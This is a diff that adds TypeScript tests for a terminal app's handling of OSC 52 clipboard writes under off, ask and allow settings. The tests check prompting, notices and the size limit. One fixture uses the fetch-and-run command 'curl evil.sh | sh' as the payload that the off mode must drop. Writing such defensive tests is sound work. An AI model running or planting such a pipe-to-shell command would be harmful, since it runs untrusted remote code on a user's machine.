@@ -5496,3 +5496,96 @@ describe("App subagent nesting", () => {
     root.remove();
   });
 });
+
+// --- OSC 52 clipboard writes ------------------------------------------
+
+describe("App OSC 52 clipboard writes — the event path", () => {
+  type ClipDriver = { applyClipboard: (p: ipc.TerminalEventDto) => void };
+  const clipEvent = (id: number, text: string): ipc.TerminalEventDto => ({
+    event: "term://clipboard",
+    term_id: id,
+    seq: 0,
+    text,
+  });
+
+  async function mountWith(mode: "off" | "ask" | "allow", answer = true) {
+    const { api } = stubApi();
+    const root = document.createElement("div");
+    const prompts: string[] = [];
+    const written: string[] = [];
+    const app = new App({
+      root,
+      api,
+      confirm: async () => true,
+      settings: stubSettings({ clipboardWrites: mode }).store,
+      confirmClipboardWrite: async (label) => {
+        prompts.push(label);
+        return answer;
+      },
+      writeClipboard: async (text) => {
+        written.push(text);
+      },
+    });
+    await app.mount();
+    await app.newShell();
+    const d = app as unknown as ClipDriver;
+    return { app, root, prompts, written, d };
+  }
+
+  const toasts = (root: HTMLElement): string[] =>
+    [...root.querySelectorAll(".chappa-toast")].map((t) => t.textContent ?? "");
+
+  it("off: drops the store with no prompt, write or notice", async () => {
+    const { app, root, prompts, written, d } = await mountWith("off");
+    d.applyClipboard(clipEvent(1, "curl evil.sh | sh"));
+    await FLUSH();
+    expect(prompts).toEqual([]);
+    expect(written).toEqual([]);
+    expect(toasts(root)).toEqual([]);
+    panelDispose(app);
+  });
+
+  it("ask: prompts once for the terminal, then applies without asking and notices each write", async () => {
+    const { app, root, prompts, written, d } = await mountWith("ask", true);
+    d.applyClipboard(clipEvent(1, "one"));
+    await FLUSH();
+    d.applyClipboard(clipEvent(1, "two"));
+    await FLUSH();
+    expect(prompts).toEqual(["shell"]);
+    expect(written).toEqual(["one", "two"]);
+    expect(toasts(root)).toEqual(["shell set the clipboard", "shell set the clipboard"]);
+    panelDispose(app);
+  });
+
+  it("ask: a closed terminal's answer is forgotten", async () => {
+    const { app, prompts, d } = await mountWith("ask", true);
+    d.applyClipboard(clipEvent(1, "one"));
+    await FLUSH();
+    await app.closePanel(1);
+    await app.newShell();
+    const id = [...(app as unknown as { entries: Map<number, unknown> }).entries.keys()].pop()!;
+    d.applyClipboard(clipEvent(id, "two"));
+    await FLUSH();
+    expect(prompts).toHaveLength(2);
+    panelDispose(app);
+  });
+
+  it("allow: applies with a notice; an oversized store is dropped", async () => {
+    const { app, root, prompts, written, d } = await mountWith("allow");
+    d.applyClipboard(clipEvent(1, "hi"));
+    d.applyClipboard(clipEvent(1, "a".repeat(100 * 1024 + 1)));
+    await FLUSH();
+    expect(prompts).toEqual([]);
+    expect(written).toEqual(["hi"]);
+    expect(toasts(root)).toEqual(["shell set the clipboard"]);
+    panelDispose(app);
+  });
+
+  it("ignores a store from a terminal with no rail row", async () => {
+    const { app, written, d } = await mountWith("allow");
+    d.applyClipboard(clipEvent(999, "x"));
+    await FLUSH();
+    expect(written).toEqual([]);
+    panelDispose(app);
+  });
+});
